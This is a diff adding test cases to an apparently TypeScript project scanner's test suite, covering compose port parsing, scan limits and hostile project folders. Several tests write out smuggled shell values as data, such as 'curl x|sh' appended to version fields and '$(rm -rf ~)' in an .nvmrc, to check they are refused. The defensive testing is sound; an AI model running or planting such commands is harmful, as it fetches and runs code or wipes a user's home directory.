@@ -143,6 +143,14 @@ describe("hints", () => {
 });
 
 describe("compose", () => {
+  it("port text is rebuilt from numbers: no env defaults / control characters (security-1 S5)", () => {
+    const s = parseCompose(
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: compose syntax, not JS
+      'services:\n  api:\n    build: .\n    ports: ["\u001b[2J\u202e${DB_PASSWORD:-hunter2}:3000"]\n',
+    );
+    expect(s.services[0]?.ports).toEqual([{ target: 3000, text: "3000" }]);
+  });
+
   it("anchors / merge keys, ports in every form, infra vs app, source mounts", () => {
     const s = parseCompose(`x: &c
   restart: always
@@ -304,11 +312,11 @@ describe("read-only access, links, limits", { timeout: 30_000 }, () => {
       expect(ign.candidates.map((c) => c.path)).toEqual([join(dir, "a", "b")]);
 
       const tr = await scan(h.paths, { scanRoots: [dir], limits: { folders: 2 } });
-      expect(tr.truncated).toEqual({ reason: "folders", root: dir });
+      expect(tr.truncated).toEqual({ reason: "folders" });
       expect(ScanResult.safeParse(tr).success).toBe(true);
       // what was found before the limit is still detected (review-1 C1)
       const part = await scan(h.paths, { scanRoots: [dir], limits: { folders: 4 } });
-      expect(part.truncated).toEqual({ reason: "folders", root: dir });
+      expect(part.truncated).toEqual({ reason: "folders" });
       expect(part.candidates.map((c) => [c.path, c.kind])).toEqual([[join(dir, "a", "b"), "site"]]);
       // out of time while walking: found folders are still detected with the reserve
       let t = 0;
@@ -360,8 +368,109 @@ describe("read-only access, links, limits", { timeout: 30_000 }, () => {
       mkdirSync(good);
       writeFileSync(join(good, "index.html"), "<p>hi</p>");
       const r = await scan(h.paths, { scanRoots: [wide, good], limits: { folders: 20 } });
-      expect(r.truncated).toEqual({ reason: "folders", root: wide });
+      expect(r.truncated).toEqual({ reason: "folders" });
       expect(r.candidates.map((c) => c.path)).toEqual([good]);
+    } finally {
+      await h.cleanup();
+    }
+  });
+
+  it("missing roots next to a big root do not cut it (review-2 R1)", async () => {
+    const h = await tempHome();
+    try {
+      const big = join(dir, "big");
+      for (let i = 0; i < 70; i++) mkdirSync(join(big, `d${i}`), { recursive: true });
+      mkdirSync(join(big, "zz", "site"), { recursive: true });
+      writeFileSync(join(big, "zz", "site", "index.html"), "<p>hi</p>");
+      const missing = Array.from({ length: 9 }, (_, i) => join(dir, `nope${i}`));
+      const r = await scan(h.paths, { scanRoots: [big, ...missing], limits: { folders: 100 } });
+      expect(r.truncated).toBe(false);
+      expect(r.candidates.map((c) => c.path)).toEqual([join(big, "zz", "site")]);
+    } finally {
+      await h.cleanup();
+    }
+  });
+
+  it("a hostile first root cannot use up candidates / bytes of the next (review-2 R2)", async () => {
+    const h = await tempHome();
+    try {
+      const evil = join(dir, "evil");
+      for (let i = 0; i < 60; i++) {
+        mkdirSync(join(evil, `p${i}`), { recursive: true });
+        writeFileSync(join(evil, `p${i}`, "package.json"), `{"x":"${"y".repeat(2000)}"}`);
+      }
+      const good = join(dir, "good");
+      mkdirSync(good);
+      writeFileSync(join(good, "package.json"), '{"devDependencies":{"vite":"^7.0.0"}}');
+      writeFileSync(join(good, "index.html"), "<p>hi</p>");
+      const cand = await scan(h.paths, { scanRoots: [evil, good], limits: { candidates: 20 } });
+      expect(cand.truncated).toEqual({ reason: "candidates" });
+      expect(cand.candidates.find((c) => c.path === good)?.kind).toBe("site");
+      const bytes = await scan(h.paths, { scanRoots: [evil, good], limits: { bytes: 20_000 } });
+      expect(bytes.truncated).toEqual({ reason: "bytes" });
+      expect(bytes.candidates.find((c) => c.path === good)?.kind).toBe("site");
+    } finally {
+      await h.cleanup();
+    }
+  });
+
+  it("runtime hints refuse shell characters; packageManager is name@x.y.z (security-1 S6)", async () => {
+    const h = await tempHome();
+    try {
+      const p = join(dir, "p");
+      mkdirSync(p);
+      writeFileSync(
+        join(p, "package.json"),
+        JSON.stringify({
+          dependencies: { express: "4" },
+          engines: { node: "22; curl x|sh" },
+          packageManager: "pnpm@9.0.0; curl x|sh",
+        }),
+      );
+      writeFileSync(join(p, ".nvmrc"), "$(rm -rf ~)\n");
+      const q = join(dir, "q");
+      mkdirSync(q);
+      writeFileSync(
+        join(q, "package.json"),
+        JSON.stringify({
+          dependencies: { express: "4" },
+          engines: { node: ">=20 <23" },
+          packageManager: "pnpm@9.15.0+sha512.abc",
+        }),
+      );
+      const r = await scan(h.paths, { scanRoots: [dir] });
+      const by = Object.fromEntries(r.candidates.map((c) => [c.name, c.services.app?.runtime]));
+      expect(by.p).toBeUndefined();
+      expect(by.q).toEqual([
+        { lang: "node", hint: ">=20 <23", source: "package.json engines.node" },
+        { lang: "pnpm", hint: "pnpm@9.15.0", source: "package.json packageManager" },
+      ]);
+    } finally {
+      await h.cleanup();
+    }
+  });
+
+  it("a non-web folder above does not hide projects (C6); merges stay inside roots (S4)", async () => {
+    const h = await tempHome();
+    try {
+      writeFileSync(join(dir, "requirements.txt"), "requests\n");
+      mkdirSync(join(dir, "site"));
+      writeFileSync(join(dir, "site", "index.html"), "<p>hi</p>");
+      const r = await scan(h.paths, { scanRoots: [dir] });
+      expect(r.candidates.map((c) => [c.name, c.kind])).toContainEqual(["site", "site"]);
+
+      const w = join(dir, "w");
+      for (const n of ["frontend", "backend"]) {
+        mkdirSync(join(w, n), { recursive: true });
+        writeFileSync(
+          join(w, n, "package.json"),
+          JSON.stringify({ dependencies: n === "frontend" ? { vite: "7" } : { express: "4" } }),
+        );
+      }
+      const two = await scan(h.paths, { scanRoots: [join(w, "frontend"), join(w, "backend")] });
+      expect(two.candidates.map((c) => c.path).sort()).toEqual(
+        [join(w, "backend"), join(w, "frontend")].sort(),
+      );
     } finally {
       await h.cleanup();
     }
